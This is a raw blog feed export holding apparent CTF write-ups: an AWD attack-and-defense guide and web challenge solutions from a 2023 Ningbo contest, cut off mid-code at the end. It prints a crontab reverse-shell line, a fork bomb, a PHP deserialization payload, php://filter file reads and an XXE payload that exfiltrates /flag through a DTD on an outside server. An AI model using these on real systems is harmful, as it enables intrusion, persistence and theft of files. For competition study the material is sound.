class="hljs-number">20</span>,<span class="hljs-number">92</span>,<span class="hljs-number">92</span>,<span class="hljs-number">8</span>,<span class="hljs-number">28</span>,<span class="hljs-number">25</span>,<span class="hljs-number">81</span>,<span class="hljs-number">83</span>,<span class="hljs-number">7</span>,<span class="hljs-number">28</span>,<span class="hljs-number">76</span>,<span class="hljs-number">88</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">29</span>,<span class="hljs-number">73</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">4</span>,<span class="hljs-number">87</span>,<span class="hljs-number">87</span>,<span class="hljs-number">82</span>,<span class="hljs-number">84</span>,<span class="hljs-number">85</span>,<span class="hljs-number">4</span>,<span class="hljs-number">85</span>,<span class="hljs-number">87</span>,<span class="hljs-number">30</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(a)):<br>    a[i]=a[i]^a[i-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;签到卡&quot;&gt;&lt;a href=&quot;#签到卡&quot; class=&quot;headerlink&quot; title=&quot;签到卡&quot;&gt;&lt;/a&gt;签到</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="ciscn" scheme="https://www.dr0n.top/tags/ciscn/"/>
    
    <category term="2023" scheme="https://www.dr0n.top/tags/2023/"/>
    
  </entry>
  
  <entry>
    <title>AWD攻击与防御</title>
    <link href="https://www.dr0n.top/posts/6118732e/"/>
    <id>https://www.dr0n.top/posts/6118732e/</id>
    <published>2023-05-21T12:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.903Z</updated>
    
    <content type="html"><![CDATA[<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>如果官方没公开靶机地址（通常不会给），则攻击手首先要做的事就是先找到每个主机地址和端口</p><p>用工具或者自己的脚本都行，不过建议提前准备好脚本，现场写会慢一点可能还会出问题</p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p><strong>ssh弱口令</strong><br>可能会有些队伍没有改</p><p><strong>web弱口令</strong><br>一般在后台登录处，或者phpmyadmin之类的服务</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>代码审计是攻防一体的工作，当发现漏洞时，进攻的同时跟防守的队友商讨如何修复</p><p><strong>预留后门</strong><br>某些地市级awd比赛为了降低难度一般会设置一句话木马，注意第一时间删除然后用脚本去批量打其他主机</p><p><strong>其他漏洞</strong></p><p>将源码下载到本地，先用D盾或者河马等扫描工具大概扫描下，在深入挖掘漏洞</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p><strong>不死马</strong></p><p>参考文章：<a href="https://www.lewiserii.top/awd/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95.html">AWD不死马与克制方法</a></p><p><strong>内核漏洞提权</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">https://github.com/The-Z-Labs/linux-exploit-suggester<br></code></pre></td></tr></table></figure><p><strong>crontab写定时任务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//每分钟反弹shell到 127.0.0.1的5353端口<br>(crontab -l;<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;* * * * * /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/5353 0&gt;&amp;1&#x27;\n&quot;</span>)|crontab -<br></code></pre></td></tr></table></figure><h2 id="搅屎"><a href="#搅屎" class="headerlink" title="搅屎"></a>搅屎</h2><p>1：到最后一轮时，该拿完的flag拿到时可以进行删站，无限复制等操作</p><p>2：fork炸弹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##!/bin/sh</span><br>/bin/echo <span class="hljs-string">&#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27;</span> &gt; /tmp/aaa;/bin/bash /tmp/aaa;<br></code></pre></td></tr></table></figure><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h2 id="web防御"><a href="#web防御" class="headerlink" title="web防御"></a>web防御</h2><h4 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h4><p>ssh命令登录或者使用图形化工具连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">//ssh连接<br>ssh -p 2222 ctf@xx.xx.xx.xx<br><br>//免密登录<br>ssh-copy-id -i ~/.ssh/id_rsa.pub ctf@xx.xx.xx.xx<br></code></pre></td></tr></table></figure><h4 id="备份源码"><a href="#备份源码" class="headerlink" title="备份源码"></a>备份源码</h4><p>比赛一开始就需要有一个队友对网站源码和数据库数据进行备份，如果后续被删站了可以及时恢复</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##网址备份</span><br>tar -zcvf web.tar.gz /var/www/html<br><br><span class="hljs-comment">##数据库备份-全部数据</span><br>mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql<br><span class="hljs-comment">##数据库备份-指定数据库和表</span><br>mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql<br><span class="hljs-comment">##数据库恢复（mysql终端下执行）</span><br><span class="hljs-built_in">source</span> /tmp/db.sql<br></code></pre></td></tr></table></figure><h4 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h4><p><strong>ssh密码</strong><br>如果发现拿到的ssh密码不是类似于<code>SDs2dKJaH5hs</code>的随机强口令，而是类似于<code>ctf/123456</code>，则需要更改ssh密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">passwd<br></code></pre></td></tr></table></figure><p><strong>web后台密码</strong><br>一般题目大概率是一个cms或者自己写的网站，那么后台就有可能存在弱口令，需要修改</p><p><strong>mysql密码</strong><br>mysql密码是很多队伍会忽略的地方，当然也同样重要。改完要注意cms中的配置文件，不然可能会导致cms连不上数据库而崩溃</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##方法一（mysql终端下执行）</span><br>show databases;<br>use mysql<br><span class="hljs-built_in">set</span> password <span class="hljs-keyword">for</span> root@localhost = password(<span class="hljs-string">&#x27;123&#x27;</span>);<br><br><span class="hljs-comment">##方法二（mysql终端下执行）</span><br>update user <span class="hljs-built_in">set</span> password = PASSWORD(<span class="hljs-string">&#x27;需要更换的密码&#x27;</span>) <span class="hljs-built_in">where</span> user=<span class="hljs-string">&#x27;root&#x27;</span>;<br>flush privileges;<br>show tables;<br><br><span class="hljs-comment">##方法三</span><br>mysqladmin -u用户名 -p旧密码 password 新密码<br></code></pre></td></tr></table></figure><h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>一般先用D盾，河马等工具扫一遍，发现一句话木马等较明显的漏洞，再用seay等或手动分析，或者可以找找历史漏洞cve等</p><p>找到漏洞后根据漏洞的种类进行修复</p><p>1：删站<br>不建议。如果参赛手册中没有明确禁止，这是最简单粗暴的姿势</p><p>2：删页面<br>只要删掉有漏洞的页面就行了，比如删后台登录页面、注册页面、上传页面等等</p><p>3：破坏正常功能<br>如果手册中规定了不能删除任何页面，则可以让这些漏洞点的功能函数失效</p><p>4：正常修补手段<br>如加白名单，字符过滤转义，设置open_basedir等，有权限还可以修改php.ini，改完记得重启</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">;禁用危险函数<br>disable_functions = exec,system,shell_exec,popen,passthru,pcntl_exec,phpinfo<br><br>;预防sql注入<br>magic_quotes_gpc = on<br><br>;远程文件包含<br>allow_url_fopen = off<br>allow_url_include = off<br><br>;重启php服务<br>service php-fpm restart<br></code></pre></td></tr></table></figure><h4 id="上waf"><a href="#上waf" class="headerlink" title="上waf"></a>上waf</h4><p>waf也是比较重要的一点。一般可以分为两个类型，一种是只有监控的功能，可以监控流量方便分析其他队的payload，一般比赛的检查都能通过。另一种就是带拦截的防御waf，也称通防，一般比赛不允许使用</p><p>几个waf项目</p><p>1：AoiAWD<br>安恒维护的开源项目，需要提前在本机编译，支持web，pwn流量捕获，系统进程监控等<br>地址：<a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a></p><p>2：watchbird<br>通防waf，支持流量转发和替换flag，防御注入，反序列化，rce等漏洞<br>地址：<a href="https://github.com/leohearts/awd-watchbird">https://github.com/leohearts/awd-watchbird</a></p><h4 id="shell查杀"><a href="#shell查杀" class="headerlink" title="shell查杀"></a>shell查杀</h4><p>对于不死马可以参考我以前写的一篇文章：<a href="https://www.lewiserii.top/awd/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95.html">AWD不死马与克制方法</a></p><p>一些find命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##寻找最近20分钟修改过的文件</span><br>find /var/www/html -name *.php -mmin -20<br><br><span class="hljs-comment">##寻找行数最短的文件</span><br>find ./ -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs <span class="hljs-built_in">wc</span> -l | <span class="hljs-built_in">sort</span> -rg<br><br><span class="hljs-comment">##关键字查杀</span><br>find . -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="hljs-string">&#x27;eval(&#x27;</span><br></code></pre></td></tr></table></figure><p>查看进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -nlpt<br>ps -<span class="hljs-built_in">df</span><br>top<br></code></pre></td></tr></table></figure><p>杀死进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -9 PID<br>killall 名称<br></code></pre></td></tr></table></figure><h4 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h4><p>经过实践，发现别名似乎在网站上rce执行命令时并不会生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##修改cat的别名</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">&quot;echo `date`|md5sum|cut -d &#x27; &#x27; -f1||&quot;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">&quot;printf &#x27;flag&#123;%s&#125;&#x27; <span class="hljs-subst">$(date | md5sum | cut -d &#x27; &#x27; -f1)</span>&quot;</span><br><br><br><span class="hljs-comment">##去除别名</span><br><span class="hljs-built_in">unalias</span> -a<br></code></pre></td></tr></table></figure><h2 id="pwn防御"><a href="#pwn防御" class="headerlink" title="pwn防御"></a>pwn防御</h2><h4 id="打patch"><a href="#打patch" class="headerlink" title="打patch"></a>打patch</h4><p>参考：<a href="https://q1iq.top/IDA-patch">https://q1iq.top/IDA-patch</a></p><h4 id="上通防"><a href="#上通防" class="headerlink" title="上通防"></a>上通防</h4><p>现在大部分比赛不允许上通防，因为通防基本可以实现完美防御</p><p>通防是通用防御的简称。因为awd里pwn题的形式基本都是运行一个二进制，然后把二进制的流量转发到某个端口，所以如果给这个pwn题加个壳子过滤一下流量，所有带flag的字符串都不允许输出，所有带flag的文件都不允许打开，基本上就没办法攻击了。</p><p>以下是几个通防项目</p><p><a href="https://github.com/rip1s/PwnSandboxForCTF">PwnSandboxForCTF</a>：Ptrace，劫持敏感syscall，检查参数过滤敏感字符串</p><p><a href="https://github.com/TTY-flag/evilPatcher">evilPatcher</a>：Seccomp沙盒，劫持syscall，无法过滤指针类参数</p><p><a href="https://github.com/I0gan/pwn_waf">pwn_waf</a>：抓取流量、通防、转发、多人转发模式，</p><p><a href="https://lief-project.github.io/download/">LIEF</a>：劫持敏感函数调用，过滤敏感字符串等。对原文件改动较小</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;攻击&quot;&gt;&lt;a href=&quot;#攻击&quot; class=&quot;headerlink&quot; title=&quot;攻击&quot;&gt;&lt;/a&gt;攻击&lt;/h1&gt;&lt;h2 id=&quot;主机发现&quot;&gt;&lt;a href=&quot;#主机发现&quot; class=&quot;headerlink&quot; title=&quot;主机发现&quot;&gt;&lt;/a&gt;主机发现&lt;/h</summary>
      
    
    
    
    <category term="awd" scheme="https://www.dr0n.top/categories/awd/"/>
    
    
    <category term="awd" scheme="https://www.dr0n.top/tags/awd/"/>
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>2023宁波市赛wp</title>
    <link href="https://www.dr0n.top/posts/2d3983d/"/>
    <id>https://www.dr0n.top/posts/2d3983d/</id>
    <published>2023-05-20T06:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.927Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h2><p>sqlmap一把梭</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/Query.png"></p><h2 id="Deserialization"><a href="#Deserialization" class="headerlink" title="Deserialization"></a>Deserialization</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//The location of the flag is at route.php</span><br><span class="hljs-variable">$read</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;read&quot;</span>];<br><span class="hljs-variable">$input</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;input&quot;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$read</span>) <span class="hljs-keyword">or</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$read</span>, <span class="hljs-string">&quot;f14g&quot;</span>)===<span class="hljs-literal">FALSE</span>)<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$read</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$input</span>);<br>    <span class="hljs-variable">$input2</span> = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$input</span>;<br>    <span class="hljs-variable">$input2</span>-&gt;position = <span class="hljs-string">&quot;route.php&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>php://filter</code>读<code>route.php</code></p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;h1&gt;Here can you find the position of the flag!&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$position</span> = <span class="hljs-string">&quot;f14g.php&quot;</span>;<br><span class="hljs-variable">$gadget</span> = <span class="hljs-string">&quot;h1nt.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>再读<code>h1nt.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$position</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;position);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;position;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化，调用<code>__clone</code>方法时读<code>f14g.php</code><br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$position</span>=<span class="hljs-string">&#x27;f14g.php&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//read=h1nt.php&amp;input=O:4:&quot;test&quot;:1:&#123;s:8:&quot;position&quot;;s:8:&quot;f14g.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="CodeCheck"><a href="#CodeCheck" class="headerlink" title="CodeCheck"></a>CodeCheck</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;***********&quot;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">or</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])!== <span class="hljs-string">&quot;flag&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])!==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>php://input</code>使得a的值为<code>flag</code>，b同理，d使用<code>php://filter</code>读文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/CodeCheck.png"></p><h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>访问靶机自动跳转到<code>/parser?body=%7B&quot;1&quot;%3A&quot;2&quot;%7D</code>，并返回<code>json</code><br>访问<code>/parser?body=1</code>，返回<code>plain</code></p><p>猜测这是一个类型解析器，可以解析输入的数据类型并返回</p><p>fuzz后发现支持xml格式，尝试利用xxe漏洞。因为是java环境，尝试使用<code>jar协议</code>，<a href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html#jar-x2F-x2F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">原理参考</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_java-1.png"></p><p>vps上用flask构建一个恶意dtd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;!ENTITY % c SYSTEM <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;<br>&lt;!ENTITY % a <span class="hljs-string">&quot;&lt;!ENTITY remote SYSTEM &#x27;jar:http://20.2.129.79/1.zip!/%c;&#x27;&gt;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>在apache上放一个1.zip，内容随意</p><p>当<code>jar协议</code>在<code>1.zip</code>中找不到<code>file://</code>中指定的文件时就会报错，通过报错回显文件内容</p><p>且过滤了<code>&quot;http</code>，可以使用<code>&quot;url:http</code>来绕过</p><p>最终payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;url:http://20.2.129.79:7777/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %b;</span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">convert</span>&gt;</span><span class="hljs-symbol">&amp;remote;</span><span class="hljs-tag">&lt;/<span class="hljs-name">convert</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_java-2.png"></p><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>打开靶机后有一个文件上传功能</p><p>但是对路径，后缀，文件内容进行了检测</p><p>路径中过滤了<code>..</code>，不能进行目录穿越，只能存放在<code>/tmp/</code>下，·且后缀检查的黑名单较严格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_path</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black_list</span> = [<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&#x27;\.\.&#x27;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$black_list</span>) . <span class="hljs-string">&#x27;)/i&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$path</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_extension</span>(<span class="hljs-params"><span class="hljs-variable">$extension</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black_list</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;php3&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>, <span class="hljs-string">&#x27;phtml&#x27;</span>, <span class="hljs-string">&#x27;py&#x27;</span>, <span class="hljs-string">&#x27;pl&#x27;</span>,<span class="hljs-string">&#x27;pyc&#x27;</span>,<span class="hljs-string">&#x27;php7&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;ini&#x27;</span>,<span class="hljs-string">&#x27;htaccess&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$extension</span>),<span class="hljs-variable">$black_list</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">up_base64</span>(<span class="hljs-params"><span class="hljs-variable">$file_path</span>, <span class="hljs-variable">$base64</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span 